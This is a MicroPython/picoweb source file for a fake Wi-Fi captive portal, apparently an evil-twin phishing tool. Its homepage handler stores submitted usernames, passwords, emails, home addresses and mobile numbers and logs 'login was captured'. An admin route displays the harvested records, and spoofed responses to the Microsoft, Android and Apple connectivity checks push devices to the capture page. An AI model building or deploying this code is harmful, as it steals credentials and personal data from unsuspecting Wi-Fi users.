#from flask import abort, jsonify, render_template, request
import gc
from .app import app
from .models import LoginData
from . import config

import ure as re
import picoweb
from . import ijson

def get_page():
    page = request.args.get('page')
    if not page or not page.isdigit():
        return 1
    return min(int(page), 1)

@app.route('/', methods=['GET', 'POST'])
def homepage(request, response):
    if request.method == 'POST':
        print(request.headers)
        yield from request.read_form_data()
        if request.form.get('username'):
            login_id = LoginData.create(username=request.form['username'][0],
                                        password=request.form['password'][0],
                                        email=request.form['email'][0],
                                        street=request.form['street'][0],
                                        city=request.form['city'][0],
                                        postcode=request.form['postcode'][0],
                                        country=request.form['country'][0],
                                        mobile=request.form['mobile'][0],
                                        content=request.form['content'][0])
            login = list(LoginData.get_id(login_id))[0]
            print("login was captured:", login)
            tmpl = app._load_template('login.html')
            yield from picoweb.start_response(response, "application/json")
            yield from response.awriteiter(ijson.idumps({'login': tmpl(login), 'success': 1}))
            return
        yield from picoweb.jsonify(response, {'success': 0})
        return

    yield from picoweb.start_response(response)
    logins = []
    yield from app.render_template(response, 'homepage.html', (logins,))
    gc.collect()

@app.route('/admin', methods=['GET', 'POST'])
def homepage(request, response):
    logins = []
    if request.method == 'POST':
        print(request.headers)
        yield from request.read_form_data()
        if request.form.get('username'):
            username = request.form.get('username')[0]
            password = request.form.get('password')[0]
            if username == 'admin' and password == config.DB_PASSWORD:
                logins = LoginData.public()
            yield from picoweb.start_response(response)
            yield from app.render_template(response, 'admin.html', (logins,))
        else:
            yield from picoweb.start_response(response)
            yield from app.render_template(response, 'admin.html', (logins,))
    else:
        yield from picoweb.start_response(response)
        yield from app.render_template(response, 'admin.html', (logins,))
    gc.collect()

@app.route(re.compile('^/archive/(.+)'), methods=['POST'])
def archive_note(request, response):
    pkey = picoweb.utils.unquote_plus(request.url_match.group(1))
    print("archive_note", pkey)
    LoginData.update({"timestamp": pkey}, archived=1)
    yield from picoweb.jsonify(response, {'success': True})
    gc.collect()
## captive portal
# microsoft
@app.route('/ncsi.txt', methods=['GET', 'POST'])
def ncsi(request, response):
    yield from response.awrite("HTTP/1.1 200 OK\r\n")
    yield from response.awrite("Content-Type: text/html\r\n")
    yield from response.awrite("\r\n")
    yield from response.awrite("Microsoft NCSI\r\n")
    yield from response.awrite("\r\n")
    gc.collect()

@app.route('/connecttest.txt', methods=['GET', 'POST'])
def connecttest(request, response):
    yield from response.awrite("HTTP/1.1 200 OK\r\n")
    yield from response.awrite("Content-Type: text/html\r\n")
    yield from response.awrite("\r\n")
    yield from response.awrite("Microsoft Connect Test\r\n")
    yield from response.awrite("\r\n")
    gc.collect()

@app.route('/redirect', methods=['GET', 'POST'])
def redirect(request, response):
    yield from response.awrite("HTTP/1.1 302 Found\r\n")
    yield from response.awrite("Location: http://login.com\r\n")
    yield from response.awrite("\r\n")
    gc.collect()
# android
@app.route('/generate_204', methods=['GET', 'POST'])
def generate_204(request, response):
    yield from response.awrite("HTTP/1.1 200 OK\r\n")
    yield from response.awrite("Content-Type: text/html\r\n")
    yield from response.awrite("\r\n")
    yield from response.awrite("\r\n")
    gc.collect()

@app.route('/gen_204', methods=['GET', 'POST'])
def redirect(request, response):
    yield from response.awrite("HTTP/1.1 302 Found\r\n")
    yield from response.awrite("Location: http://login.com\r\n")
    yield from response.awrite("\r\n")
    gc.collect()

# apple
# @app.route('/hotspot-detect.html', methods=['GET', 'POST'])
# def success(request, response):
#     yield from response.awrite("HTTP/1.1 200 OK\r\n")
#     yield from response.awrite("Content-Type: text/html\r\n")
#     yield from response.awrite("\r\n")
#     yield from response.awrite("Success\r\n")
#     yield from response.awrite("\r\n")
#     gc.collect()

@app.route('/hotspot-detect.html', methods=['GET', 'POST'])
def redirect(request, response):
    yield from response.awrite("HTTP/1.1 302 Found\r\n")
    yield from response.awrite("Location: http://login.com\r\n")
    yield from response.awrite("\r\n")
    gc.collect()
